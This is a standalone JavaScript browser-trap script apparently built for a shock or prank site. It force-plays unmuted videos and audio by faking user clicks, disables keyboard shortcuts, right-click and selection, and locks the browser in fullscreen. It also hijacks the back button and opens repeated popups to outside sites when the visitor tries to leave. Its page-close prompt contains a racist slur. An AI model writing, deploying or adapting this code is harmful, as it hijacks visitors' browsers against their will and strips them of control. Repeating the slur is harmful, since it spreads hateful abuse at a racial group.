<script>
// Enhanced anti-block and auto-execution script
(function() {
    // Override browser audio/video blocking
    const originalPlay = HTMLMediaElement.prototype.play;
    HTMLMediaElement.prototype.play = function() {
        const promise = originalPlay.call(this);
        if (promise !== undefined) {
            promise.catch(error => {
                // Force play anyway
                this.muted = true;
                originalPlay.call(this).catch(() => {
                    // Create fake user interaction
                    const event = new MouseEvent('click', {
                        view: window,
                        bubbles: true,
                        cancelable: true
                    });
                    document.dispatchEvent(event);
                    setTimeout(() => originalPlay.call(this), 100);
                });
            });
        }
        return promise;
    };

    // Disable keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        // Block F11, F12, Escape, Alt+F4 (via Alt), Ctrl+W, Ctrl+R, etc.
        if (e.key === 'F11' || e.key === 'F12' || e.key === 'Escape' || 
            (e.altKey && e.key === 'F4') || (e.ctrlKey && e.key === 'w') ||
            (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.shiftKey && e.key === 'T')) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
    }, true);

    // Disable right-click and context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);

    // Disable text selection
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);

    // Trap focus within page
    document.addEventListener('blur', function() {
        window.focus();
    }, true);

    // Prevent window close
    window.onbeforeunload = function(e) {
        e.preventDefault();
        e.returnValue = 'I hate niggers.';
        return 'I hate niggers.';
    };

    // Block back button
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.pushState(null, null, location.href);
    };

    // Auto-start function - updated for dual videos
    function autoBrapp() {
        // Remove blocking elements
        const elementsToRemove = ['poo', 'poo2', 'poo3', 'poo4'];
        elementsToRemove.forEach(id => {
            const el = document.getElementById(id);
            if (el) el.parentNode.removeChild(el);
        });

        // Play both videos simultaneously with anti-block measures
        const videos = [
            document.getElementById('fart'),
            document.getElementById('ronnie')
        ];
        
        const audios = [
            document.getElementById('shart'),
            document.getElementById('shart2'),
            document.getElementById('shart3')
        ];

        // Unmute videos and set volume
        videos.forEach((video, index) => {
            if (video) {
                video.muted = false;
                video.volume = 1.0;
                video.play().catch(e => {
                    // If blocked, create fake user gesture
                    const fakeClick = new MouseEvent('click', {
                        bubbles: true,
                        cancelable: true,
                        view: window
                    });
                    document.dispatchEvent(fakeClick);
                    setTimeout(() => video.play(), index * 50);
                });
            }
        });

        // Play all audio with volume control
        audios.forEach((audio, index) => {
            if (audio) {
                audio.volume = 0.8;
                audio.play().catch(e => {
                    // Chain attempts with increasing delay
                    setTimeout(() => {
                        audio.muted = false;
                        audio.play().catch(() => {
                            // Last resort: create invisible button and simulate click
                            const btn = document.createElement('button');
                            btn.style.display = 'none';
                            document.body.appendChild(btn);
                            btn.click();
                            setTimeout(() => audio.play(), 100);
                        });
                    }, index * 100);
                });
            }
        });

        // Force fullscreen
        setTimeout(forceFullscreen, 500);
        
        // Add synchronization for dual videos
        syncVideos();
    }
    
    // Synchronize both videos to play at same time
    function syncVideos() {
        const video1 = document.getElementById('fart');
        const video2 = document.getElementById('ronnie');
        
        if (video1 && video2) {
            // Sync playback
            video1.addEventListener('play', () => {
                if (video2.paused) video2.play();
            });
            
            video2.addEventListener('play', () => {
                if (video1.paused) video1.play();
            });
            
            // Sync time
            setInterval(() => {
                if (Math.abs(video1.currentTime - video2.currentTime) > 0.1) {
                    video2.currentTime = video1.currentTime;
                }
            }, 100);
        }
    }

    // Enhanced fullscreen function
    function forceFullscreen() {
        const elem = document.documentElement;
        
        // Try all fullscreen methods
        const methods = [
            () => elem.requestFullscreen(),
            () => elem.mozRequestFullScreen(),
            () => elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT),
            () => elem.msRequestFullscreen()
        ];

        // Create fake interaction for fullscreen
        const fakeEvent = new MouseEvent('click', {
            view: window,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(fakeEvent);

        // Attempt each method
        methods.forEach((method, index) => {
            setTimeout(() => {
                try {
                    method.call(elem);
                } catch(e) {
                    // Continue to next method
                }
            }, index * 200);
        });

        // Lock fullscreen state
        document.addEventListener('fullscreenchange', lockFullscreen);
        document.addEventListener('webkitfullscreenchange', lockFullscreen);
        document.addEventListener('mozfullscreenchange', lockFullscreen);
        document.addEventListener('MSFullscreenChange', lockFullscreen);
    }

    function lockFullscreen() {
        if (!document.fullscreenElement && 
            !document.webkitFullscreenElement && 
            !document.mozFullScreenElement && 
            !document.msFullscreenElement) {
            // Immediately re-enter fullscreen
            setTimeout(forceFullscreen, 10);
        }
    }

    // Open multiple tabs/windows to prevent easy closure
    function openMultiTabs() {
        try {
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    window.open('https://kekman.vercel.app', '_blank', 
                    'noopener,noreferrer,width=' + screen.width + ',height=' + screen.height + ',fullscreen=yes');
                }, i * 1000);
            }
        } catch(e) {
            // Ignore popup blocker
        }
    }

    // Prevent tab/window close
    window.addEventListener('pagehide', function(e) {
        e.preventDefault();
        openMultiTabs();
    });

    window.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            openMultiTabs();
        }
    });

    // Override original functions
    window.brapp = autoBrapp;
    window.tfs = forceFullscreen;
    window.ahyesmydear = function() {
        window.open("https://stumpgrinder.info/", "_blank", 
        "noopener,noreferrer,width=" + screen.width + ",height=" + screen.height);
    };

    // Auto-start on load with multiple triggers
    window.addEventListener('load', function() {
        // Multiple activation triggers
        setTimeout(autoBrapp, 100);
        
        // Create multiple fake interactions
        for (let i = 1; i <= 5; i++) {
            setTimeout(() => {
                ['click', 'mousedown', 'touchstart', 'keydown'].forEach(eventType => {
                    const event = new Event(eventType, {
                        bubbles: true,
                        cancelable: true
                    });
                    document.dispatchEvent(event);
                });
            }, i * 300);
        }

        // Open additional tabs
        setTimeout(openMultiTabs, 2000);
        
        // Continuous fullscreen enforcement
        setInterval(forceFullscreen, 5000);
        
        // Sync videos periodically
        setInterval(syncVideos, 3000);
    });

    // Also trigger on any user interaction (as backup)
    ['click', 'touchstart', 'keydown', 'mousemove'].forEach(event => {
        document.addEventListener(event, autoBrapp, { once: true });
    });

    // Auto-click the hidden fullscreen button
    document.getElementById('fullscreenButton').addEventListener('click', autoBrapp);
    setTimeout(() => {
        document.getElementById('fullscreenButton').click();
    }, 50);
    
    // Initialize dual video layout
    function initDualVideo() {
        const videoContainer = document.querySelector('.video-container');
        if (videoContainer) {
            videoContainer.style.display = 'flex';
        }
    }
    
    // Initialize on load
    window.addEventListener('DOMContentLoaded', initDualVideo);
})();
</script>
